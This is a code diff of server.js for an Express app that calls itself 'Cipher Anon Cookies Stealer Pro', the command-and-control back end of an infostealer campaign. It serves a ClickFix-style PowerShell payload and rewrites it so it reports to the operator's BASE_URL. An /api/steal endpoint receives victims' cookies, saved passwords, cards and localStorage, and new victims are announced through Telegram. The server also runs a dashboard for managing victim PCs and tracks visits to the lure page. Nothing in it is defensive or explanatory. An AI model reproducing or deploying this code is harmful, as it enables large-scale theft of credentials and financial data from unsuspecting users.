@@ -1,12 +1,8 @@
 // ============================================================
-// SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
+// SERVER.JS — Cipher Anon Cookies Stealer Pro v2.1
 // Railway Ready — Full Environment Variable Support
-// Fixed: Dedup uses IP + userAgent + screen + nonce + data check
-// Fixed: Handles PowerShell payload with PC name
-// Clean URLs: NO .php in address bar — serves directly
-// LocalStorage: Supports new localStorage field from payload
-// Rename PC: API endpoint to rename PC across all victims
-// Visitor Tracking: Tracks /home and /payload.ps1 visits
+// SINGLE ENV: BASE_URL for all scripts
+// Dynamic Payload Injection — replaces {{BASE_URL}} in payload.ps1
 // ============================================================
 
 const express = require('express');
@@ -42,6 +38,7 @@ function loadConfig() {
         TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN',
         TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID',
         SEND_NOTIFICATIONS: process.env.SEND_NOTIFICATIONS !== 'false',
+        BASE_URL: process.env.BASE_URL || `https://${process.env.RAILWAY_STATIC_URL || 'localhost:' + PORT}`,
     };
 
     // Try to read config.json for persistence
@@ -82,6 +79,7 @@ console.log(`[+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
 console.log(`[+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
 console.log(`[+] Encryption Key: ${CONFIG.ENCRYPTION_KEY.slice(0,8)}...`);
 console.log(`[+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED' : 'DISABLED'}`);
+console.log(`[+] BASE_URL: ${CONFIG.BASE_URL}`);
 
 // ============================================================
 // DATA FILES
@@ -215,7 +213,6 @@ function cleanDedup() {
 }
 
 function getRealIp(req) {
-    // Try X-Forwarded-For first (Railway uses this)
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
         const ips = forwarded.split(',').map(ip => ip.trim());
@@ -412,7 +409,7 @@ ${flag} *Country:* ${countryName}
 📡 *ISP:* ${isp}
 🕐 *Time:* ${time}
 
-📊 *Dashboard:* ${process.env.DASHBOARD_URL || 'https://' + (req?.headers?.host || 'localhost:' + PORT)}/dashboard`;
+📊 *Dashboard:* ${CONFIG.BASE_URL}/dashboard`;
 
     try {
         await axios.post(`https://api.telegram.org/bot${t}/sendMessage`, {
@@ -548,7 +545,7 @@ app.post('/api/steal', async (req, res) => {
         const nonce = data.nonce || '';
         const source = data.source || 'browser';
 
-        // ---- If this is from the PowerShell payload, extract PC name ----
+        // If this is from the PowerShell payload, extract PC name
         if (source === 'clickfix_payload' && data.system && data.system.hostname) {
             if (data.fingerprint) {
                 data.fingerprint.hostname = data.system.hostname;
@@ -558,10 +555,10 @@ app.post('/api/steal', async (req, res) => {
             data.victimUsername = data.system.username || 'Unknown';
             data.victimOS = data.system.os || 'Unknown';
             
-            log(`[PAYLOAD] PC: ${data.system.hostname} | User: ${data.system.username} | ${data.cookies?.length || 0} cookies, ${data.passwords?.length || 0} passwords, ${data.cards?.length || 0} cards, ${Object.keys(data.localStorage || {}).length} LocalStorage | ${realIp}`);
+            log(`[PAYLOAD] PC: ${data.system.hostname} | User: ${data.system.username} | ${Object.keys(data.cookies || {}).length} cookies, ${data.credentials?.length || 0} passwords, ${data.cards?.length || 0} cards, ${Object.keys(data.localStorage || {}).length} LocalStorage | ${realIp}`);
         }
 
-        // ---- NUCLEAR DEDUP ----
+        // NUCLEAR DEDUP
         if (isDuplicate(req, userAgent, screen, nonce, source)) {
             log(`[!] Duplicate from ${realIp} — ignored`);
             return res.json({ status: 'ok', duplicate: true });
@@ -785,7 +782,6 @@ app.post('/api/rename-pc', requireAuth, (req, res) => {
     let updatedMain = 0;
     let updatedTrash = 0;
 
-    // Update in stolenData
     stolenData.forEach(entry => {
         const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
         if (pc === oldName) {
@@ -794,7 +790,6 @@ app.post('/api/rename-pc', requireAuth, (req, res) => {
         }
     });
 
-    // Update in trashData
     trashData.forEach(entry => {
         const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
         if (pc === oldName) {
@@ -810,7 +805,6 @@ app.post('/api/rename-pc', requireAuth, (req, res) => {
         });
     }
 
-    // Save both files
     saveData(DATA_FILE, stolenData);
     saveData(TRASH_FILE, trashData);
 
@@ -825,41 +819,97 @@ app.post('/api/rename-pc', requireAuth, (req, res) => {
 });
 
 // ============================================================
-// FRONTEND ROUTES — CLEAN URLS + VISITOR TRACKING
+// DYNAMIC PAYLOAD INJECTION — SINGLE ENV
 // ============================================================
 
-// ---- Public Routes (No Auth Required) ----
-app.get('/', (req, res) => {
-    if (req.session && req.session.authenticated) {
-        return res.redirect('/dashboard');
+function getBaseUrl() {
+    return CONFIG.BASE_URL || `https://${process.env.RAILWAY_STATIC_URL || 'localhost:' + PORT}`;
+}
+
+// ---- Serve payload.ps1 with dynamic BASE_URL injection ----
+app.get('/payload.ps1', (req, res) => {
+    // Track payload download
+    trackVisit('payload', req);
+    
+    try {
+        const baseUrl = getBaseUrl();
+        let script = fs.readFileSync(path.join(__dirname, 'public', 'payload.ps1'), 'utf8');
+        
+        // Replace {{BASE_URL}} placeholder
+        script = script.replace(/\{\{BASE_URL\}\}/g, baseUrl);
+        
+        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+        res.send(script);
+    } catch (e) {
+        log(`[!] Failed to serve payload.ps1: ${e.message}`);
+        res.status(500).send('Error loading payload');
     }
-    res.redirect('/home');
 });
 
+// ---- Serve home.php with dynamic BASE_URL injection ----
 app.get('/home', (req, res) => {
-    // Track visit
     trackVisit('home', req);
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.sendFile(path.join(__dirname, 'public', 'home.php'));
+    try {
+        const baseUrl = getBaseUrl();
+        let html = fs.readFileSync(path.join(__dirname, 'public', 'home.php'), 'utf8');
+        
+        // Replace {{BASE_URL}} placeholder in home.php
+        html = html.replace(/\{\{BASE_URL\}\}/g, baseUrl);
+        
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+        res.send(html);
+    } catch (e) {
+        log(`[!] Failed to serve home.php: ${e.message}`);
+        res.status(500).send('Error loading page');
+    }
 });
 
+// ---- Serve dashboard.php with dynamic BASE_URL injection ----
+app.get('/dashboard', requireAuth, (req, res) => {
+    try {
+        const baseUrl = getBaseUrl();
+        let html = fs.readFileSync(path.join(__dirname, 'public', 'dashboard.php'), 'utf8');
+        
+        // Replace {{BASE_URL}} placeholder in dashboard.php
+        html = html.replace(/\{\{BASE_URL\}\}/g, baseUrl);
+        
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+        res.send(html);
+    } catch (e) {
+        log(`[!] Failed to serve dashboard.php: ${e.message}`);
+        res.status(500).send('Error loading dashboard');
+    }
+});
+
+// ---- Serve other static files with BASE_URL injection ----
 app.get('/login', (req, res) => {
     if (req.session && req.session.authenticated) {
         return res.redirect('/dashboard');
     }
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.sendFile(path.join(__dirname, 'public', 'login.php'));
-});
-
-// ---- Protected Routes (Auth Required) ----
-app.get('/dashboard', requireAuth, (req, res) => {
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
+    try {
+        const baseUrl = getBaseUrl();
+        let html = fs.readFileSync(path.join(__dirname, 'public', 'login.php'), 'utf8');
+        html = html.replace(/\{\{BASE_URL\}\}/g, baseUrl);
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        res.send(html);
+    } catch (e) {
+        res.status(500).send('Error loading login');
+    }
 });
 
 app.get('/password-success', requireAuth, (req, res) => {
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
+    try {
+        const baseUrl = getBaseUrl();
+        let html = fs.readFileSync(path.join(__dirname, 'public', 'password-success.php'), 'utf8');
+        html = html.replace(/\{\{BASE_URL\}\}/g, baseUrl);
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        res.send(html);
+    } catch (e) {
+        res.status(500).send('Error loading page');
+    }
 });
 
 // ---- Serve DLLs from public folder ----
@@ -873,14 +923,6 @@ app.get('/LevelDB.netAll.dll', (req, res) => {
 
 app.get('/leveldb.dll', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'leveldb.dll'));
-});
-
-// ---- Serve payload.ps1 with tracking ----
-app.get('/payload.ps1', (req, res) => {
-    // Track payload download
-    trackVisit('payload', req);
-    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-    res.sendFile(path.join(__dirname, 'public', 'payload.ps1'));
 });
 
 // ---- Fallback .php routes (redirect to clean URLs for backward compatibility) ----
@@ -904,19 +946,26 @@ app.get('/password-success.php', requireAuth, (req, res) => {
 });
 
 // ============================================================
-// SERVE .PHP FILES — BLOCK DIRECT ACCESS
+// SERVE .PHP FILES — BLOCK DIRECT ACCESS (with injection)
 // ============================================================
 
 app.get('*.php', (req, res, next) => {
     const filePath = path.join(__dirname, 'public', req.path);
+    const baseUrl = getBaseUrl();
     
     // Public .php files (no auth required)
     const publicPhp = ['/login.php', '/home.php'];
     
     if (publicPhp.includes(req.path)) {
         if (fs.existsSync(filePath)) {
-            res.setHeader('Content-Type', 'text/html; charset=utf-8');
-            return res.sendFile(filePath);
+            try {
+                let html = fs.readFileSync(filePath, 'utf8');
+                html = html.replace(/\{\{BASE_URL\}\}/g, baseUrl);
+                res.setHeader('Content-Type', 'text/html; charset=utf-8');
+                return res.send(html);
+            } catch (e) {
+                return next();
+            }
         }
         return next();
     }
@@ -927,13 +976,25 @@ app.get('*.php', (req, res, next) => {
     }
     
     if (fs.existsSync(filePath)) {
-        res.setHeader('Content-Type', 'text/html; charset=utf-8');
-        res.sendFile(filePath);
+        try {
+            let html = fs.readFileSync(filePath, 'utf8');
+            html = html.replace(/\{\{BASE_URL\}\}/g, baseUrl);
+            res.setHeader('Content-Type', 'text/html; charset=utf-8');
+            res.send(html);
+        } catch (e) {
+            next();
+        }
     } else {
         const basePath = filePath.replace(/\.php$/, '');
         if (fs.existsSync(basePath)) {
-            res.setHeader('Content-Type', 'text/html; charset=utf-8');
-            res.sendFile(basePath);
+            try {
+                let html = fs.readFileSync(basePath, 'utf8');
+                html = html.replace(/\{\{BASE_URL\}\}/g, baseUrl);
+                res.setHeader('Content-Type', 'text/html; charset=utf-8');
+                res.send(html);
+            } catch (e) {
+                next();
+            }
         } else {
             next();
         }
@@ -985,13 +1046,14 @@ app.use((err, req, res, next) => {
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log('\n' + '='.repeat(55));
-    console.log('  🍪 CIPHER ANON COOKIES STEALER PRO v2.0');
+    console.log('  🍪 CIPHER ANON COOKIES STEALER PRO v2.1');
     console.log('='.repeat(55));
     console.log(`  [+] Server: http://localhost:${PORT}`);
-    console.log(`  [+] Login: http://localhost:${PORT}/login`);
-    console.log(`  [+] Home: http://localhost:${PORT}/home`);
-    console.log(`  [+] Dashboard: http://localhost:${PORT}/dashboard`);
-    console.log(`  [+] Health: http://localhost:${PORT}/health`);
+    console.log(`  [+] BASE_URL: ${CONFIG.BASE_URL}`);
+    console.log(`  [+] Login: ${CONFIG.BASE_URL}/login`);
+    console.log(`  [+] Home: ${CONFIG.BASE_URL}/home`);
+    console.log(`  [+] Dashboard: ${CONFIG.BASE_URL}/dashboard`);
+    console.log(`  [+] Health: ${CONFIG.BASE_URL}/health`);
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
     console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
     console.log(`  [+] Session Timeout: 30 minutes`);
@@ -999,7 +1061,8 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
     console.log(`  [+] Clean URLs: ENABLED ✅ (no .php in address bar)`);
-    console.log(`  [+] LocalStorage: ENABLED ✅ (from payload)`);
+    console.log(`  [+] Single ENV: ENABLED ✅ (BASE_URL)`);
+    console.log(`  [+] Dynamic Payload: ENABLED ✅ ({{BASE_URL}} injection)`);
     console.log(`  [+] Rename PC: ENABLED ✅ (/api/rename-pc)`);
     console.log(`  [+] Visitor Tracking: ENABLED ✅ (/home & /payload.ps1)`);
     console.log('='.repeat(55) + '\n');
